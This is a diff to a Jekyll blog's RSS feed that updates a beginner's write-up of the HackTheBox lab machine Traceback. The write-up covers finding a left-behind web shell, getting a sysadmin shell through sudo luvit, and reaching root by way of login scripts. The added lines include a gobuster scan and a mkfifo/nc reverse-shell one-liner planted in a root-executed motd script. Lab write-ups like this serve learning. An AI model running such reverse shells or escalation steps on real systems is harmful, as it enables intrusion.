@@ -5,13 +5,13 @@
     <description>A simple and awesome blog theme powered by jekyll.</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>2020-09-14</pubDate>
-    <lastBuildDate>Mon, 14 Sep 2020 21:30:31 +0200</lastBuildDate>
+    <pubDate>2020-09-20</pubDate>
+    <lastBuildDate>Sun, 20 Sep 2020 12:17:36 +0200</lastBuildDate>
     <generator>Jekyll v3.8.7</generator>
     
       <item>
         <title>HTB Traceback writeup</title>
-        <description>&lt;p&gt;Hey guys, this is my writeup for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HackTheBox&lt;/code&gt; machine &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Traceback&lt;/code&gt;. This is my first writeup so it won’t be perfect. This was an Easy rated Linux box, Okay so  the machine starts of with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web server&lt;/code&gt; that has been &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;compromised&lt;/code&gt; and defaced, the hacker leaves a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backdoor&lt;/code&gt; behind “for all the net” :), so we do some guess work and find the shell left behind and that’s the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foothold&lt;/code&gt;. after accessing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse shell&lt;/code&gt; we do some recon and find that we can run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;luvit&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo privileges&lt;/code&gt;, i then write an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh key&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysadmins&lt;/code&gt; ssh folder and get a shell as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt;, for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; we have a cron running with administrative privileges that runs everytime on a ssh login, we have the ability write the files that are executed when the cron runss.&lt;/p&gt;
+        <description>&lt;p&gt;Hey guys, this is my writeup for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HackTheBox&lt;/code&gt; machine &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Traceback&lt;/code&gt;. This is my first writeup so it won’t be perfect. This was an Easy rated Linux box, The machine starts of with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web server&lt;/code&gt; that has been &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;compromised&lt;/code&gt; and defaced, the hacker leaves a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backdoor&lt;/code&gt; behind “for all the net” :), so we do some guess work and find the shell left behind and that’s the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foothold&lt;/code&gt;. after accessing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse shell&lt;/code&gt; we do some recon and find that we can run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;luvit&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo privileges&lt;/code&gt;, i then write an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh key&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysadmins&lt;/code&gt; ssh folder and get a shell as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt;, for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; we have a cron running with administrative privileges that runs everytime on a ssh login, we have the ability write the files that are executed when the cron runss.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/img/tr_con.png&quot; alt=&quot;Traceback&quot; /&gt;
 &lt;!--more--&gt;&lt;/p&gt;
@@ -42,7 +42,9 @@
 
 &lt;p&gt;&lt;img src=&quot;/img/tr_page_source.png&quot; alt=&quot;page source&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;So i copied the comment and googled it, it brought me to a &lt;a href=&quot;https://github.com/TheBinitGhimire/Web-Shells&quot;&gt;github repository&lt;/a&gt; with a list of web shells, i could’ve done a better job at guessing which web shell was running on the server but i instead decided to start at the bottom of the list entering each file name, luckily the one i was looking for was second last.&lt;/p&gt;
+&lt;p&gt;So i copied the comment and googled it, it brought me to a &lt;a href=&quot;https://github.com/TheBinitGhimire/Web-Shells&quot;&gt;github repository&lt;/a&gt; with a list of web shells, i could’ve done a better job at guessing which web shell was running on the server but i instead decided to start at the bottom of the list entering each file name, luckily the one i was looking for was second last, but i would normally run a gobust.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.181/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;wordlist] &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 25 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php,txt &lt;span class=&quot;nt&quot;&gt;-outfile&lt;/span&gt;.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;&lt;img src=&quot;/img/tr_shell.png&quot; alt=&quot;shell&quot; /&gt;&lt;/p&gt;
 
@@ -110,15 +112,29 @@
 
 &lt;p&gt;On the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LinPeas&lt;/code&gt; output i also saw something else that was interesting, we could write files in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/update-motd.d&lt;/code&gt;
 when i login with ssh run parts executes all the scripts in the directory, these scripts are also backep up every 30 seconds  , 
-i found this out after some time analyzing what was happening. i think this was also a wat for the hacker to have a way to have root privileges in an easy and hidden way.&lt;/p&gt;
+i found this out after some time analyzing what was happening. i think this was also a way for the hacker to have a way to have root privileges in an easy and hidden way.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/img/tr_ls_w.png&quot; alt=&quot;ls_w&quot; /&gt;&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;get &lt;span class=&quot;nb&quot;&gt;command
-&lt;/span&gt;exe &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;p&gt;After seeing that i ran &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;Pspy&lt;/a&gt;, a tool for analyzing linux system processes. This is when i saw the backups of the scripts in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/update-motd.d&lt;/code&gt; where being made every 30 seconds.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/tr_pspy.png&quot; alt=&quot;ps_py&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This is also means if i modify the one of scripts in this directory it will be removed in 30 seconds.
+when i log in with ssh run-parts executes the scripts in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/update-motd.d&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/tr_ssh_pspy.png&quot; alt=&quot;run-parts&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So my method to get root here is simeple now, i have to put a reverse shell command inside one of these scripts owned and executed by root and have a listener.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.14.114 9002&amp;gt;/tmp/f&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After making this modification i have to login with ssh during the 30 second period of the scripts not being backed up, after i login i get the root shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/tr_root_shell.png&quot; alt=&quot;root&quot; /&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>2020-09-14</pubDate>
+        <pubDate>2020-09-20</pubDate>
         <link>http://localhost:4000/articles/2020-08/lets</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2020-08/lets</guid>
         
